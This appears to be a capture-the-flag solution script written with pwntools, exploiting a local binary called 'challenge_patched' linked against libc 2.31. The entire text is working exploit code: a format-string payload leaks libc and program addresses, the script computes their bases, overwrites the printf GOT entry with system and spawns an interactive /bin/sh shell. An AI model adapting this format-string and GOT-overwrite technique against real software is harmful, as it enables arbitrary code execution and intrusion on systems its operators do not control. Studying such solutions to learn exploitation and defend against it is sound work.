from pwn import *
exe = ELF('./challenge_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
payload = b'%29$p%53$p'
payload += b'<\0>'
payload = payload.ljust(30, b"A")
payload += b'</'

p = process(exe.path)
input()
# round 1
p.sendafter(b'WTML!\n', payload)
p.sendlineafter(b'quit]?\n', b"\0")
p.sendlineafter(b'tag?\n', b"\x01")
# round 2
p.recvuntil(b'</\x01')
Unknow_leak = u64(p.recv(6)+ b'\0\0')
log.info('leak :' + hex(Unknow_leak))
p.sendlineafter(b'quit]?\n', b"A")
p.sendlineafter(b'tag?\n', b"B")

p.recvuntil(b'[DEBUG] ')
exe_leak = int(p.recv(14),16)
libc_leak = int(p.recv(14),16)
log.info('libc_leak :' + hex(libc_leak))
libc.address = libc_leak - 147587
log.info('libc_base :'+ hex(libc.address))
log.info('exe_leak :' + hex(exe_leak))
exe.address = exe_leak - 4384
log.info('exe_base :'+ hex(exe.address))

# overwrite got
system = libc.sym['system'] >> 8 & 0xffff
payload = f'%{system}c%10$hn'.encode()
payload = payload.ljust(16, b"A")
payload += p64(exe.got['printf']+1)
p.sendlineafter(b'v2: ', payload)
# round 3
p.sendlineafter(b'quit]?\n', b"B")
p.sendlineafter(b'tag?\n', b"A")
p.sendline(b'/bin/sh\0')

p.interactive()
